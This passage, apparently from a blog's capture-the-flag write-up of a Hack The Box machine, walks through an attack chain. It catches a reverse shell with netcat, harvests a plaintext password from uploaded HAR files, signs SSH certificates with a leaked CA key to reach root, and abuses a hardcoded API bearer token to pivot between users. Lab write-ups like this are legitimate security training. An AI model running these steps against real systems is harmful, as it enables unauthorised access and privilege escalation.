deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=6731a9977ee8268e3a4d4c0dd18e7afb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>And we get a shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.x.x] from (UNKNOWN) [10.129.231.118] 43574</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@itrc:/var/www/itrc$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@itrc:/var/www/itrc$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Shell-as-msainristil"><a href="#Shell-as-msainristil" class="headerlink" title="Shell as msainristil"></a>Shell as msainristil</h3><p>Checking the <code>/uploads</code> directory which has the uploaded zip file to the platform I thought it might have some juicy data like credentials. So checking the <code>/home</code> directory I can see that there is a user named <code>msainristil</code>, let’s see if we can find anything interesting about him:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@itrc:/var/www/itrc/uploads$ <span class="keyword">for</span> zip <span class="keyword">in</span> ./*.zip; <span class="keyword">do</span> zipgrep <span class="string">&quot;msainristil&quot;</span> <span class="string">&quot;<span class="variable">$zip</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">&lt;p <span class="keyword">in</span> ./*.zip; <span class="keyword">do</span> zipgrep <span class="string">&quot;msainristil&quot;</span> <span class="string">&quot;<span class="variable">$zip</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">itrc.ssg.htb.har:            <span class="string">&quot;text&quot;</span>: <span class="string">&quot;user=msainristil&amp;pass=82yards2closeit&quot;</span>,</span><br><span class="line">itrc.ssg.htb.har:                <span class="string">&quot;value&quot;</span>: <span class="string">&quot;msainristil&quot;</span></span><br><span class="line">www-data@itrc:/var/www/itrc/uploads$</span><br></pre></td></tr></table></figure></div>
+
+<p>And we do find credentials for him! And we’re in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msainristil@itrc:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(msainristil) gid=1000(msainristil) <span class="built_in">groups</span>=1000(msainristil)</span><br><span class="line">msainristil@itrc:~$</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a Certificate Authority (CA) private key which can be used by a CA to sign digital certificates which allow us to authenticate the identity of users:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msainristil@itrc:~/decommission_old_ca$ <span class="built_in">ls</span></span><br><span class="line">ca-itrc  ca-itrc.pub</span><br><span class="line">msainristil@itrc:~/decommission_old_ca$ <span class="built_in">cat</span> ca-itrc.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoBD1UoFfL41g/FVX373rdm5WPz+SZ0bWt5PYP+dhok4vb3UpJPIGOeAsXmAkzEVYBHIiE+aGbrcXvDaSbZc6cI2aZfFraEPt080KVKHALAPgaOn/zFdld8P9yaENKBKltWLZ9I6rwg98IGEToB7JNZF9hzasjjD0IDKv8JQ3NwimDcZTc6Le0hJw52ANcLszteliFSyoTty9N/oUgTUjkFsgsroEh+Onz4buVD2bxoZ+9mODcdYTQ4ChwanfzFSnTrTtAQrJtyH/bDRTa2BpmdmYdQu+4HcbDl5NbiEwu1FNskz/YNDPkq3bEYEOvgMiu/0ZMy0wercx6Tn0G2cppS70/rG5GMcJi0WTcUic3k+XJ191WEG1EtXJNbZdtJc7Ky0EKhat0dgck8zpq62kejtkBQd86p6FvR8+xH3/JMxHvMNVYVODJt/MIik99sWb5Q7NCVcIXQ0ejVTzTI9QT27km/FUgl3cs5CZ4GIN7polPenQXEmdmbBOWD2hrlLs= ITRC Certifcate CA</span><br><span class="line">msainristil@itrc:~/decommission_old_ca$</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we can sign any other public keys so the system trusts us.<br>So let’s do that to pivot to the <code>zzinter</code> user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msainristil@itrc:~/decommission_old_ca$ ssh-keygen -t rsa -b 2048 -f kujen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> kujen</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> kujen.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:xlbHKHhfj8M+GHjZ2hwVtd7TIYYiFS0GbbCQgFofY4U msainristil@itrc</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|  ...+oo+oo   ...|</span></span><br><span class="line"><span class="string">| .. E...o= +.  ..|</span></span><br><span class="line"><span class="string">|.. o o.o=.+.+o.o |</span></span><br><span class="line"><span class="string">|.   .  o.=.*.+o +|</span></span><br><span class="line"><span class="string">|        S = * .oo|</span></span><br><span class="line"><span class="string">|       o . B o  .|</span></span><br><span class="line"><span class="string">|          o =    |</span></span><br><span class="line"><span class="string">|             .   |</span></span><br><span class="line"><span class="string">|                 |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">msainristil@itrc:~/decommission_old_ca$ ssh-keygen -s ca-itrc -I ca-itrc.pub -n zzinter kujen.pub</span></span><br><span class="line"><span class="string">Signed user key kujen-cert.pub: id &quot;ca-itrc.pub&quot; serial 0 for zzinter valid forever</span></span><br><span class="line"><span class="string">msainristil@itrc:~/decommission_old_ca$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now we can use this to simply ssh to zzinter:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msainristil@itrc:~/decommission_old_ca$ ssh -o CertificateFile=kujen-cert.pub -i kujen zzinter@localhost</span><br><span class="line">The authenticity of host <span class="string">&#x27;localhost (127.0.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:jwOqtWAgCouRm8byeOkLtPI34AC53x/tydC2D3z9eFA.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>localhost<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">zzinter@itrc:~$ id</span></span><br><span class="line"><span class="string">uid=1001(zzinter) gid=1001(zzinter) groups=1001(zzinter)</span></span><br><span class="line"><span class="string">zzinter@itrc:~$ ls</span></span><br><span class="line"><span class="string">sign_key_api.sh  user.txt</span></span><br><span class="line"><span class="string">zzinter@itrc:~$ cat user.txt</span></span><br><span class="line"><span class="string">ce3e9aeda31076******************</span></span><br><span class="line"><span class="string">zzinter@itrc:~$</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And we have our user flag!</p>
+<h3 id="Pivoting-to-root-ITRC"><a href="#Pivoting-to-root-ITRC" class="headerlink" title="Pivoting to root - ITRC"></a>Pivoting to root - ITRC</h3><p>We can do the same thing to escalat to root on the ITRC machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msainristil@itrc:~/decommission_old_ca$ ssh -o CertificateFile=kujen-cert.pub -i kujen root@localhost</span><br><span class="line">Linux itrc 5.15.0-117-generic <span class="comment">#127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">root@itrc:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@itrc:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-to-Support-SSG"><a href="#Pivoting-to-Support-SSG" class="headerlink" title="Pivoting to Support - SSG"></a>Pivoting to Support - SSG</h3><p>Checking what zzinter had on his home directory, we find <code>sign_key_api.sh</code> file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">usage</span></span> () &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt;&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 3 ]; <span class="keyword">then</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">public_key_file=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">username=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">principal_str=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line"></span><br><span class="line">supported_principals=<span class="string">&quot;webserver,analytics,support,security&quot;</span></span><br><span class="line">IFS=<span class="string">&#x27;,&#x27;</span> <span class="built_in">read</span> -ra principal &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$principal_str</span>&quot;</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;principal[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> ! <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$supported_principals</span>&quot;</span> | grep -qw <span class="string">&quot;<span class="variable">$word</span>&quot;</span>; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Error: &#x27;<span class="variable">$word</span>&#x27; is not a supported principal.&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Choose from:&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    webserver - external web servers - webadmin user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    analytics - analytics team databases - analytics user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    support - IT support server - support user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;    security - SOC servers - support user&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        usage</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$public_key_file</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: Public key file &#x27;<span class="variable">$public_key_file</span>&#x27; not found.&quot;</span></span><br><span class="line">    usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">public_key=$(<span class="built_in">cat</span> <span class="variable">$public_key_file</span>)</span><br><span class="line"></span><br><span class="line">curl -s signserv.ssg.htb/v1/sign -d <span class="string">&#x27;&#123;&quot;pubkey&quot;: &quot;&#x27;</span><span class="string">&quot;<span class="variable">$public_key</span>&quot;</span><span class="string">&#x27;&quot;, &quot;username&quot;: &quot;&#x27;</span><span class="string">&quot;<span class="variable">$username</span>&quot;</span><span class="string">&#x27;&quot;, &quot;principals&quot;: &quot;&#x27;</span><span class="string">&quot;<span class="variable">$principal</span>&quot;</span><span class="string">&#x27;&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -H <span class="string">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>This script is being used to sign an ssh public key with certain principals using the <code>signserv.ssg.htb</code> web server.<br>In few words: The script takes a public key, a username and a principal (from the list) as parameters.<br>Now I will first create an RSA keypair:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ ssh-keygen -t rsa -b 2048 -f key &amp;&amp; <span class="built_in">chmod</span> 600 key</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> key</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> key.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:ZUFxr6fNHOTq80gmgi2klBriDdfJTSzoNyASA96jY80 kujen@kujen</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|=        .+..    |</span></span><br><span class="line"><span class="string">|.o. . .    o .   |</span></span><br><span class="line"><span class="string">|.o = . o  o   o  |</span></span><br><span class="line"><span class="string">|. * =.=  o   +   |</span></span><br><span class="line"><span class="string">|.=.Eo*..S   . +  |</span></span><br><span class="line"><span class="string">|o.=+.o.o     B . |</span></span><br><span class="line"><span class="string">| .... o o . = +  |</span></span><br><span class="line"><span class="string">|       . . =..   |</span></span><br><span class="line"><span class="string">|            oo.  |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Then make a request to the web server using that data:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@itrc:~<span class="comment"># curl -X &#x27;POST&#x27;   &#x27;http://signserv.ssg.htb/v1/sign&#x27;   -H &#x27;accept: text/plain&#x27;   -H &#x27;Content-Type: application/json&#x27;   -H &quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;   -d &#x27;&#123;</span></span><br><span class="line">  <span class="string">&quot;pubkey&quot;</span>: <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzy73EB1FRN+0qahalGNh2dvhcNIJuXeUV7ETqcnujYY5HcKq84aZoh2VdzpPwEnd/gu9wYnYrg5k9R+wbt84qFLM5Q0oBFZA6iquq3rI7jw5fBIVLHMVRl1Jl5EHz+Lx7oabGgjAT8xNwbGaMuSLMfgJlyRI6NKyFolsWOasXBHJpjtkMqVrSPrX/yI6Y9jE5WzrihV426Txy+EiH79QE/JiYjAeV0ViB6limHEiNLcOR7phwCc7Qnu+/j9+2GABfjGcutH7dk35EzY2nMD3iUAzYejSif1/HiPXuiuG+9ufDXrIEHVKVni0XLMR5E8vplx7ZSQmy4ZJJdah+6MT3 kujen@kujen&quot;</span>,</span><br><span class="line">  <span class="string">&quot;principals&quot;</span>: <span class="string">&quot;support&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;support&quot;</span></span><br><span class="line">&#125;<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We ssh now using the 2222 ssh port we saw earlier and we are support:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ ssh -o CertificateFile=key-certificate.pub -i key support@ssg.htb -p 2222</span><br><span class="line">The authenticity of host <span class="string">&#x27;[ssg.htb]:2222 ([10.129.231.118]:2222)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:tOsmHdA7xDQq2UDyCf0EobZ/LcitevFrAQ6RSJCy10Q.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[ssg.htb]:2222<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Fri Nov 22 08:59:25 PM UTC 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:           0.0</span></span><br><span class="line"><span class="string">  Usage of /:            77.9% of 10.73GB</span></span><br><span class="line"><span class="string">  Memory usage:          16%</span></span><br><span class="line"><span class="string">  Swap usage:            0%</span></span><br><span class="line"><span class="string">  Processes:             245</span></span><br><span class="line"><span class="string">  Users logged in:       0</span></span><br><span class="line"><span class="string">  IPv4 address for eth0: 10.129.231.118</span></span><br><span class="line"><span class="string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:7353</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">support@ssg:~$ id</span></span><br><span class="line"><span class="string">uid=1000(support) gid=1000(support) groups=1000(support)</span></span><br><span class="line"><span class="string">support@ssg:~$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-to-zzinter-SSG"><a href="#Pivoting-to-zzinter-SSG" class="headerlink" title="Pivoting to zzinter - SSG"></a>Pivoting to zzinter - SSG</h3><p>We can see that this is the principal for zzinter:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">support@ssg:~$ <span class="built_in">cat</span> /etc/ssh/auth_principals/zzinter</span><br><span class="line">zzinter_temp</span><br><span class="line">support@ssg:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s do the same we just did but for zzinter this time:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span>   <span class="string">&#x27;http://signserv.ssg.htb/v1/sign&#x27;</span>   -H <span class="string">&#x27;accept: text/plain&#x27;</span>   -H <span class="string">&#x27;Content-Type: application/json&#x27;</span>   -H <span class="string">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span>   -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;pubkey&quot;: &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzy73EB1FRN+0qahalGNh2dvhcNIJuXeUV7ETqcnujYY5HcKq84aZoh2VdzpPwEnd/gu9wYnYrg5k9R+wbt84qFLM5Q0oBFZA6iquq3rI7jw5fBIVLHMVRl1Jl5EHz+Lx7oabGgjAT8xNwbGaMuSLMfgJlyRI6NKyFolsWOasXBHJpjtkMqVrSPrX/yI6Y9jE5WzrihV426Txy+EiH79QE/JiYjAeV0ViB6limHEiNLcOR7phwCc7Qnu+/j9+2GABfjGcutH7dk35EzY2nMD3iUAzYejSif1/HiPXuiuG+9ufDXrIEHVKVni0XLMR5E8vplx7ZSQmy4ZJJdah+6MT3 kujen@kujen&quot;,</span></span><br><span class="line"><span class="string">  &quot;principals&quot;: &quot;zzinter_temp&quot;,</span></span><br><span class="line"><span class="string">  &quot;username&quot;: &quot;zzinter&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+<p>And we’re in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">support@ssg:~$ curl -X <span class="string">&#x27;POST&#x27;</span>   <span class="string">&#x27;http://signserv.ssg.htb/v1/sign&#x27;</span>   -H <span class="string">&#x27;accept: text/plain&#x27;</span>   -H <span class="string">&#x27;Content-Type: application/json&#x27;</span>   -H <span class="string">&quot;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&quot;</span>   -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;pubkey&quot;: &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzy73EB1FRN+0qahalGNh2dvhcNIJuXeUV7ETqcnujYY5HcKq84aZoh2VdzpPwEnd/gu9wYnYrg5k9R+wbt84qFLM5Q0oBFZA6iquq3rI7jw5fBIVLHMVRl1Jl5EHz+Lx7oabGgjAT8xNwbGaMuSLMfgJlyRI6NKyFolsWOasXBHJpjtkMqVrSPrX/yI6Y9jE5WzrihV426Txy+EiH79QE/JiYjAeV0ViB6limHEiNLcOR7phwCc7Qnu+/j9+2GABfjGcutH7dk35EzY2nMD3iUAzYejSif1/HiPXuiuG+9ufDXrIEHVKVni0XLMR5E8vplx7ZSQmy4ZJJdah+6MT3 kujen@kujen&quot;,</span></span><br><span class="line"><span class="string">  &quot;principals&quot;: &quot;zzinter_temp&quot;,</span></span><br><span class="line"><span class="string">  &quot;username&quot;: &quot;zzinter&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line">ssh-rsa-cert-v01@openssh.com 